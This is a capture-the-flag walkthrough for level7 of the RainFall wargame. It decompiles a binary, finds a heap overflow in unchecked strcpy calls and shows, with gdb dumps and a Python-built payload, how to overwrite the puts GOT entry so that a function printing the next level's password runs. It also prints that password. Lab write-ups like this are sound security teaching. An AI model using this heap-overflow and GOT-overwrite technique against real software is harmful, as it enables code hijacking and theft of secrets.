# Walkthrough level7

Try to run the file:

```bash
level7@RainFall:~$ ./level7 
Segmentation fault (core dumped)
level7@RainFall:~$ ./level7 a
Segmentation fault (core dumped)
level7@RainFall:~$ ./level7 a b
~~
```

With the disassembly code we write the c code:
Calls to the malloc function are present. We therefore know that this is a [Heap overflow](https://youtu.be/TfJrU95q1J4?si=e2BZbRUE7gzq1ZPL).  

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

char *flag;
char *str = "~~";

void m(void) { // 0x080484f4
  printf("%s - %d\n", flag, (int)time(NULL));
}

int main(int argc, char **argv) {
  int *p1 = malloc(8); // 0x804a008
  // to inspect: x/8xw 0x0804a008
  p1[0] = 1;
  p1[1] = (int)malloc(8); // 0x804a018
  // to inspect: x/8xw 0x0804a018
  int *p2 = malloc(8); // 0x804a028
  // to inspect: x/8xw 0x0804a028
  p2[0] = 2;
  p2[1] = (int)malloc(8); //  0x0804a038
  // to inspect: x/8xw 0x0804a038
  strcpy((char *)p1[1], argv[1]);
  strcpy((char *)p2[1], argv[2]);
  fgets(flag, 68, fopen("/home/user/level8/.pass", "r"));
  puts(str);
  return 0;
}
```
We highlight the addresses of each malloc :  
p1 = 0x804a008  
p1[1] = 0x804a018  
p2 = 0x804a028  
p2[1] = 0x0804a038  

Let's take a look at the heap. To do this, we'll look for the beginning of the heap.

``` bash
(gdb) info proc mapping
process 14063
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	 0x8048000  0x8049000     0x1000        0x0 /home/user/level7/level7
	 0x8049000  0x804a000     0x1000        0x0 /home/user/level7/level7
	 0x804a000  0x806b000    0x21000        0x0 [heap]
	0xb7e2b000 0xb7e2c000     0x1000        0x0 
	0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
	0xb7fcf000 0xb7fd1000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
	0xb7fd1000 0xb7fd2000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so
	0xb7fd2000 0xb7fd5000     0x3000        0x0 
	0xb7fdb000 0xb7fdd000     0x2000        0x0 
	0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]
	0xb7fde000 0xb7ffe000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.15.so
	0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.15.so
	0xb7fff000 0xb8000000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.15.so
	0xbffdf000 0xc0000000    0x21000        0x0 [stack]
``` 
So the start address is 0x804a000.  
We can now put a breakpoint after the first "strcpy" to observe the heap.

``` bash
(gdb) run $(python -c 'print "a" * 4') $(python -c 'print"b" * 4')
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/user/level7/level7 $(python -c 'print "a" * 4') $(python -c 'print"b" * 4')

Breakpoint 5, 0x080485a5 in main ()

(gdb) x/32xw 0x804a000
0x804a000:	0x00000000	0x00000011	0x00000001	0x0804a018
0x804a010:	0x00000000	0x00000011	0x61616161	0x00000000
0x804a020:	0x00000000	0x00000011	0x00000002	0x0804a038
0x804a030:	0x00000000	0x00000011	0x00000000	0x00000000
0x804a040:	0x00000000	0x00020fc1	0x00000000	0x00000000
0x804a050:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a060:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a070:	0x00000000	0x00000000	0x00000000	0x00000000
```
We can overflow p1[1] to erase 0x0804a038 who is the address of p2[1] and put "puts@plt" address.  
We must write 20 characters to attemps 0x0804a038.

``` bash
(gdb) disas 'puts@plt'
Dump of assembler code for function puts@plt:
   0x08048400 <+0>:	jmp    DWORD PTR ds:0x8049928
   0x08048406 <+6>:	push   0x28
   0x0804840b <+11>:	jmp    0x80483a0
End of assembler dump.

```
"puts@plt" address is 0x08049928.

``` bash
(gdb) run $(python -c 'print "a" * 20 + "\x28\x99\x04\x08"') $(python -c 'print"b" * 4')
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/user/level7/level7 $(python -c 'print "a" * 20 + "\x28\x99\x04\x08"') $(python -c 'print"b" * 4')

Breakpoint 5, 0x080485a5 in main ()
(gdb) x/32xw 0x804a000
0x804a000:	0x00000000	0x00000011	0x00000001	0x0804a018
0x804a010:	0x00000000	0x00000011	0x61616161	0x61616161
0x804a020:	0x61616161	0x61616161	0x61616161	0x08049928
0x804a030:	0x00000000	0x00000011	0x00000000	0x00000000
0x804a040:	0x00000000	0x00020fc1	0x00000000	0x00000000
0x804a050:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a060:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a070:	0x00000000	0x00000000	0x00000000	0x00000000
```

We have overflow this part.  
Now we can check after the 2nd strcpy: strcpy((char *)p2[1], argv[2]);

```bash
(gdb) x/xs 0x08049928
0x8049928 <puts@got.plt>:	 "bbbb"
```

We have changed the address of p2[1] to that of puts. So in the puts address we have argv[2].  
Because of puts function is used after.  
We now want point to the address of our function m.

```bash
(gdb) disas m
Dump of assembler code for function m:
   0x080484f4 <+0>:	push   ebp
   0x080484f5 <+1>:	mov    ebp,esp
   0x080484f7 <+3>:	sub    esp,0x18
   0x080484fa <+6>:	mov    DWORD PTR [esp],0x0
   0x08048501 <+13>:	call   0x80483d0 <time@plt>
   0x08048506 <+18>:	mov    edx,0x80486e0
   0x0804850b <+23>:	mov    DWORD PTR [esp+0x8],eax
   0x0804850f <+27>:	mov    DWORD PTR [esp+0x4],0x8049960
   0x08048517 <+35>:	mov    DWORD PTR [esp],edx
   0x0804851a <+38>:	call   0x80483b0 <printf@plt>
   0x0804851f <+43>:	leave  
   0x08048520 <+44>:	ret    
End of assembler dump.
```

Function m address is 0x080484f4.  
Since we're copying argv[2] to the desired address, all we need to do is enter the address of function m in argv[2].  
So, puts address will be replace by m address.

```bash
level7@RainFall:~$ ./level7 $(python -c 'print "a" * 20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 - 1708577258
``` 

In brief, argv[1] is used to access the puts function and argv[2] is used to replace this address by address of function m.  
So it's not the puts function that's called, but the m function.
